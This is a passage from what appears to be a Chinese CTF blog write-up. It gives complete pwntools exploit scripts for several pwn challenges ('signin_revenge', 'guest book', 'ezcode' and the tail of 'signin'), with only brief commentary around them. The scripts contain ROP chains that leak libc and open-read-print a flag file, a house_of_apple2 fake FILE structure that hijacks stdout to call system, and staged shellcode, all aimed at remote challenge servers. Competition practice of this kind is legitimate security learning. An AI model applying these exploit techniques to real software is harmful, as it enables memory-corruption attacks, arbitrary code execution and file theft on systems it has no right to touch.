class="hljs-number">4</span>)<br>    sla(<span class="hljs-string">&quot;Index: &quot;</span>,<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn_exp</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;PWN&#x27;</span>)<br>    p1 = <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">10</span>+p32(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span><br>    s(p1)<br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">100</span>):<br>        v = r_l.rand()%<span class="hljs-number">100</span>+<span class="hljs-number">1</span><br>        sa(<span class="hljs-string">&quot;Input the authentication code:&quot;</span>,p64(v))<br>   p2=<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x108</span>+p64(pop_rdi)+p64(elf.got[<span class="hljs-string">&#x27;read&#x27;</span>])+p64(elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>])+p64(<span class="hljs-number">0x4013c0</span>)<br>    add(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;A&#x27;</span>,p2)<br>    sleep(<span class="hljs-number">0.1</span>)<br>    ru(<span class="hljs-string">b&#x27;\x0a&#x27;</span>)<br>    libc.address = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))-libc.sym.read<br>    p3 = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x108</span>+p64(pop_rdx+libc.address)+p64(<span class="hljs-number">0x300</span>)+p64(libc.sym.read)<br>    sl(p3)<br>    sleep(<span class="hljs-number">0.1</span>)<br>    p4=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x120</span>+p64(<span class="hljs-number">0x4013EF</span>)*<span class="hljs-number">8</span><br>    p4+=p64(pop_rdi)+p64(<span class="hljs-number">0</span>)+p64(pop_rsi+libc.address)+p64(<span class="hljs-number">0x404200</span>)+p64(libc.sym.read)<br>    p4+=p64(pop_rdi)+p64(<span class="hljs-number">0x404200</span>)+p64(pop_rsi+libc.address)+p64(<span class="hljs-number">0</span>)+p64(pop_rdx+libc.address)+p64(<span class="hljs-number">0x0</span>)+p64(libc.sym.<span class="hljs-built_in">open</span>)<br>    p4+=p64(pop_rdi)+p64(<span class="hljs-number">3</span>)+p64(pop_rsi+libc.address)+p64(<span class="hljs-number">0x404700</span>)+p64(pop_rdx+libc.address)+p64(<span class="hljs-number">0x300</span>)+p64(libc.sym.read)<br>   p4+=p64(pop_rdi)+p64(<span class="hljs-number">0x404700</span>)+p64(pop_rsi+libc.address)+p64(<span class="hljs-number">0</span>)+p64(libc.sym.puts)<br>    sl(p4)<br>    pause()<br>    p5=<span class="hljs-string">b&#x27;./flag\x00&#x27;</span><br>    sl(p5)<br>    <br>    <span class="hljs-comment">#log.info(&#x27;#---#---#---#---#&#x27;)</span><br>    <span class="hljs-comment">#libc=LibcSearcher(&quot;gets&quot;,gets_Addr);</span><br>    <span class="hljs-comment">#log.success(&#x27;libc.address:&#x27;+hex(libc.address))</span><br>    <span class="hljs-comment">#log.success(&#x27;elf.address:&#x27;+hex(elf.address))</span><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br>    pwn_exp()<br>    io.interactive()<br></code></pre></td></tr></table></figure><h2 id="signin-revenge"><a href="#signin-revenge" class="headerlink" title="signin_revenge"></a>signin_revenge</h2><p>直接栈溢出了这下</p><p>比signin简化了一些, revenge?</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># -*-coding:utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>io_ch=<span class="hljs-number">1</span><br>de_bug=<span class="hljs-number">1</span><br>url=<span class="hljs-string">&#x27;127.0.0.1&#x27;</span><span class="hljs-comment">#&#x27;210.44.150.15&#x27;</span><br>port=<span class="hljs-number">9999</span><span class="hljs-comment">#35942</span><br>arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>filename=<span class="hljs-string">&#x27;./pwn&#x27;</span><br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=arch)<br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>]<br><span class="hljs-keyword">if</span> io_ch==<span class="hljs-number">1</span>:<br>    <span class="hljs-comment">#io=remote(url,port)</span><br>    io = remote(<span class="hljs-string">&quot;pwn-4c5ea24842.challenge.xctf.org.cn&quot;</span>, <span class="hljs-number">9999</span>, ssl=<span class="hljs-literal">True</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-comment">#io=process([&quot;qemu-aarch64-static&quot;,&quot;-g&quot;,&quot;1234&quot;,&quot;./pwn&quot;])</span><br>    io=process(filename)<br>    <span class="hljs-keyword">if</span> de_bug==<span class="hljs-number">1</span>:<br>        gdb.attach(io)<br><span class="hljs-keyword">if</span> filename!=<span class="hljs-string">&#x27;&#x27;</span>:<br>    elf=ELF(filename)<br>    libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br>s  = <span class="hljs-keyword">lambda</span> content : io.send(content)<br>sl = <span class="hljs-keyword">lambda</span> content : io.sendline(content)<br>sa = <span class="hljs-keyword">lambda</span> content,send : io.sendafter(content, send)<br>sla = <span class="hljs-keyword">lambda</span> content,send : io.sendlineafter(content, send)<br>rc = <span class="hljs-keyword">lambda</span> number : io.recv(number)<br>ru = <span class="hljs-keyword">lambda</span> content : io.recvuntil(content)<br>rcg = <span class="hljs-keyword">lambda</span> : u64(rc(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>r_l = cdll.LoadLibrary(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br>r_l.srand(<span class="hljs-number">0</span>)<br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br>pop_rdi = <span class="hljs-number">0x0000000000401393</span><br>pop_rsi = <span class="hljs-number">0x2601f</span><br>pop_rdx = <span class="hljs-number">0x142c92</span><br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br><br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn_exp</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;PWN&#x27;</span>)<br>    ru(<span class="hljs-string">&quot;lets move and pwn!&quot;</span>)<br>    p2=<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x108</span>+p64(pop_rdi)+p64(elf.got[<span class="hljs-string">&#x27;read&#x27;</span>])+p64(elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>])+p64(<span class="hljs-number">0x4012c0</span>)<br>    sl(p2)<br>    sleep(<span class="hljs-number">0.1</span>)<br>    ru(<span class="hljs-string">b&#x27;\x0a&#x27;</span>)<br>    libc.address = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))-libc.sym.read<br>    p3 = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x108</span>+p64(pop_rdx+libc.address)+p64(<span class="hljs-number">0x300</span>)+p64(libc.sym.read)<br>    sl(p3)<br>    sleep(<span class="hljs-number">0.1</span>)<br>    p4=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x120</span>+p64(<span class="hljs-number">0x4012EF</span>)*<span class="hljs-number">8</span><br>    p4+=p64(pop_rdi)+p64(<span class="hljs-number">0</span>)+p64(pop_rsi+libc.address)+p64(<span class="hljs-number">0x404200</span>)+p64(libc.sym.read)<br>    p4+=p64(pop_rdi)+p64(<span class="hljs-number">0x404200</span>)+p64(pop_rsi+libc.address)+p64(<span class="hljs-number">0</span>)+p64(pop_rdx+libc.address)+p64(<span class="hljs-number">0x0</span>)+p64(libc.sym.<span class="hljs-built_in">open</span>)<br>    p4+=p64(pop_rdi)+p64(<span class="hljs-number">3</span>)+p64(pop_rsi+libc.address)+p64(<span class="hljs-number">0x404700</span>)+p64(pop_rdx+libc.address)+p64(<span class="hljs-number">0x300</span>)+p64(libc.sym.read)<br>    p4+=p64(pop_rdi)+p64(<span class="hljs-number">0x404700</span>)+p64(pop_rsi+libc.address)+p64(<span class="hljs-number">0</span>)+p64(libc.sym.puts)<br>    sl(p4)<br>    pause()<br>    p5=<span class="hljs-string">b&#x27;/flag\x00&#x27;</span><br>    sl(p5)<br><br>    <span class="hljs-comment">#log.info(&#x27;#---#---#---#---#&#x27;)</span><br><br>    <span class="hljs-comment">#libc=LibcSearcher(&quot;gets&quot;,gets_Addr);</span><br><br>    <span class="hljs-comment">#log.success(&#x27;libc.address:&#x27;+hex(libc.address))</span><br><br>    <span class="hljs-comment">#log.success(&#x27;elf.address:&#x27;+hex(elf.address))</span><br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br><br>    pwn_exp()<br>    io.interactive()<br></code></pre></td></tr></table></figure><h2 id="guest-book"><a href="#guest-book" class="headerlink" title="guest book"></a>guest book</h2><p>glibc为2.35<br>先是正常的泄露libc<br>直接整形溢出编辑<code>_IO_2_1_stdout_</code>, 打<code>house_of_apple2</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># -*-coding:utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> pwncli <span class="hljs-keyword">import</span> IO_FILE_plus_struct<br><br>io_ch=<span class="hljs-number">1</span><br>de_bug=<span class="hljs-number">1</span><br>url=<span class="hljs-string">&#x27;127.0.0.1&#x27;</span><span class="hljs-comment">#&#x27;210.44.150.15&#x27;</span><br>port=<span class="hljs-number">9999</span><span class="hljs-comment">#35942</span><br>arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>filename=<span class="hljs-string">&#x27;./pwn&#x27;</span><br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=arch)<br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>]<br><span class="hljs-keyword">if</span> io_ch==<span class="hljs-number">1</span>:<br>    <span class="hljs-comment">#io=remote(url,port)</span><br>    io = remote(<span class="hljs-string">&quot;pwn-521faf0d6e.challenge.xctf.org.cn&quot;</span>, <span class="hljs-number">9999</span>, ssl=<span class="hljs-literal">True</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-comment">#io=process([&quot;qemu-aarch64-static&quot;,&quot;-g&quot;,&quot;1234&quot;,&quot;./pwn&quot;])</span><br>    io=process(filename)<br>    <span class="hljs-keyword">if</span> de_bug==<span class="hljs-number">1</span>:<br>        gdb.attach(io)<br><span class="hljs-keyword">if</span> filename!=<span class="hljs-string">&#x27;&#x27;</span>:<br>    elf=ELF(filename)<br>    libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br>s  = <span class="hljs-keyword">lambda</span> content : io.send(content)<br>sl = <span class="hljs-keyword">lambda</span> content : io.sendline(content)<br>sa = <span class="hljs-keyword">lambda</span> content,send : io.sendafter(content, send)<br>sla = <span class="hljs-keyword">lambda</span> content,send : io.sendlineafter(content, send)<br>rc = <span class="hljs-keyword">lambda</span> number : io.recv(number)<br>ru = <span class="hljs-keyword">lambda</span> content : io.recvuntil(content)<br>rcg = <span class="hljs-keyword">lambda</span> : u64(rc(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>r_l = cdll.LoadLibrary(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br>r_l.srand(<span class="hljs-number">0</span>)<br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br><br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd</span>(<span class="hljs-params">c</span>):<br>    sla(<span class="hljs-string">&quot;[+] 5.exit&quot;</span>,<span class="hljs-built_in">str</span>(c))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx,size</span>):<br>    cmd(<span class="hljs-number">1</span>)<br>    sla(<span class="hljs-string">&quot;index&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br>    sla(<span class="hljs-string">&quot;size&quot;</span>,<span class="hljs-built_in">str</span>(size))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,data</span>):<br>    cmd(<span class="hljs-number">2</span>)<br>    sla(<span class="hljs-string">&quot;index&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br>    sa(<span class="hljs-string">&quot;content&quot;</span>,data)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>):<br>    cmd(<span class="hljs-number">3</span>)<br>    sla(<span class="hljs-string">&quot;index&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    cmd(<span class="hljs-number">4</span>)<br>    sla(<span class="hljs-string">&quot;index&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn_exp</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;PWN&#x27;</span>)<br>    add(<span class="hljs-number">0</span>,<span class="hljs-number">0x500</span>)<br>    add(<span class="hljs-number">1</span>,<span class="hljs-number">0x500</span>)<br>    free(<span class="hljs-number">0</span>)<br>    add(<span class="hljs-number">2</span>,<span class="hljs-number">0x520</span>)<br>    show(<span class="hljs-number">0</span>)<br>    ru(<span class="hljs-string">b&#x27;\x0a&#x27;</span>)<br>    libc.address = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))-<span class="hljs-number">0x7d479881b110</span>+<span class="hljs-number">0x7d4798600000</span><br>    edit(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x10</span>)<br>    show(<span class="hljs-number">0</span>)<br>    ru(<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x10</span>)<br>    heap_1 = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))+<span class="hljs-number">1312</span><br>    add(<span class="hljs-number">12</span>,<span class="hljs-number">0x510</span>)<br>    fake_io = IO_FILE_plus_struct()<br>    fake_io.flags = <span class="hljs-number">0x2f6e69622f3b1111</span><br>    fake_io._IO_read_ptr = <span class="hljs-number">0x6873</span><br>    fake_io._IO_write_base = <span class="hljs-number">0</span><br>    fake_io._IO_write_ptr = <span class="hljs-number">1</span><br>    fake_io.chain = libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>    fake_io.vtable = libc.sym[<span class="hljs-string">&#x27;_IO_wfile_jumps&#x27;</span>]<br>    fake_io._codecvt = libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>]<span class="hljs-comment">#_wide_data-&gt;_wide_vtable A+0xe0</span><br>    fake_io._wide_data = libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>]-<span class="hljs-number">0x48</span> <span class="hljs-comment"># A</span><br>    fake_io._lock = heap_1<br>    p = <span class="hljs-built_in">bytes</span>(fake_io)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(p))<br>    edit(-<span class="hljs-number">8</span>,p)<br>    <br>    <span class="hljs-comment">#log.info(&#x27;#---#---#---#---#&#x27;)</span><br>    <span class="hljs-comment">#libc=LibcSearcher(&quot;gets&quot;,gets_Addr);</span><br>    <span class="hljs-comment">#log.success(&#x27;libc.address:&#x27;+hex(libc.address))</span><br>    <span class="hljs-comment">#log.success(&#x27;elf.address:&#x27;+hex(elf.address))</span><br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br><br>    pwn_exp()<br>    io.interactive()<br></code></pre></td></tr></table></figure><h2 id="ezcode"><a href="#ezcode" class="headerlink" title="ezcode"></a>ezcode</h2><p>主要shellcode比较难搓<br>最初一直计划将dx改大,但是拼尽全力无法战胜<br>然后发现如果我们第二次写入7个字节,我们可以利用<code>jmp</code>跳转过去,对已经执行过的区域进行修改后的再次执行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># -*-coding:utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> pwncli <span class="hljs-keyword">import</span> IO_FILE_plus_struct<br><br>io_ch=<span class="hljs-number">1</span><br>de_bug=<span class="hljs-number">1</span><br>url=<span class="hljs-string">&#x27;127.0.0.1&#x27;</span><span class="hljs-comment">#&#x27;210.44.150.15&#x27;</span><br>port=<span class="hljs-number">9999</span><span class="hljs-comment">#35942</span><br>arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>filename=<span class="hljs-string">&#x27;./pwn&#x27;</span><br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=arch)<br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>]<br><span class="hljs-keyword">if</span> io_ch==<span class="hljs-number">1</span>:<br>    <span class="hljs-comment">#io=remote(url,port)</span><br>    remote(<span class="hljs-string">&quot;pwn-04c8177097.challenge.xctf.org.cn&quot;</span>, <span class="hljs-number">9999</span>, ssl=<span class="hljs-literal">True</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-comment">#io=process([&quot;qemu-aarch64-static&quot;,&quot;-g&quot;,&quot;1234&quot;,&quot;./pwn&quot;])</span><br>    io=process(filename)<br>    <span class="hljs-keyword">if</span> de_bug==<span class="hljs-number">1</span>:<br>        gdb.attach(io)<br><span class="hljs-keyword">if</span> filename!=<span class="hljs-string">&#x27;&#x27;</span>:<br>    elf=ELF(filename)<br>    libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br>s  = <span class="hljs-keyword">lambda</span> content : io.send(content)<br>sl = <span class="hljs-keyword">lambda</span> content : io.sendline(content)<br>sa = <span class="hljs-keyword">lambda</span> content,send : io.sendafter(content, send)<br>sla = <span class="hljs-keyword">lambda</span> content,send : io.sendlineafter(content, send)<br>rc = <span class="hljs-keyword">lambda</span> number : io.recv(number)<br>ru = <span class="hljs-keyword">lambda</span> content : io.recvuntil(content)<br>rcg = <span class="hljs-keyword">lambda</span> : u64(rc(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>r_l = cdll.LoadLibrary(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br>r_l.srand(<span class="hljs-number">0</span>)<br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br><br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br>shellcode = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">mov dx,7</span><br><span class="hljs-string">mov ax,10</span><br><span class="hljs-string">mov rdi,r15</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">mov esi,ecx</span><br><span class="hljs-string">xor eax,eax</span><br><span class="hljs-string">xor edi,edi</span><br><span class="hljs-string">jmp $-8</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>s1 = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">mov edx,ebx</span><br><span class="hljs-string">xor eax,eax</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>orw = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">mov rdi,rsi</span><br><span class="hljs-string">xor rsi,rsi</span><br><span class="hljs-string">xor rdx,rdx</span><br><span class="hljs-string">mov rax,2</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">mov rdi,3</span><br><span class="hljs-string">mov rsi,r15</span><br><span class="hljs-string">add rsi,0x500</span><br><span class="hljs-string">mov rdx,0x100</span><br><span class="hljs-string">mov rax,0</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">mov rdi,1</span><br><span class="hljs-string">mov rax,1</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn_exp</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;PWN&#x27;</span>)<br>    shell_code = asm(shellcode).ljust(<span class="hljs-number">0x16</span>,<span class="hljs-string">b&#x27;\x90&#x27;</span>)<br>    payload = <span class="hljs-string">b&#x27;&#123;&quot;shellcode&quot;:&quot;&#x27;</span>+(shell_code.<span class="hljs-built_in">hex</span>()).encode()+<span class="hljs-string">b&#x27;&quot;&#125;&#x27;</span><br>    sl(payload)<br>    ru(<span class="hljs-string">&quot;loaded!&quot;</span>)<br>    p = asm(s1)<br>    sl(p)<br>    pause()<br>    orw_ = <span class="hljs-string">b&#x27;flag\x00&#x27;</span>+asm(orw)<br>    sl(orw_)<br><br>    <br>    <span class="hljs-comment">#log.info(&#x27;#---#---#---#---#&#x27;)</span><br>    <span class="hljs-comment">#libc=LibcSearcher(&quot;gets&quot;,gets_Addr);</span><br>    <span class="hljs-comment">#log.success(&#x27;libc.address:&#x27;+hex(libc.address))</span><br>    <span class="hljs-comment">#log.success(&#x27;elf.address:&#x27;+hex(elf.address))</span><br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br><br>    pwn_exp()<br>    io.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DASCTF 2024金秋十月｜秋意浓，战火燃，码上见真章</title>
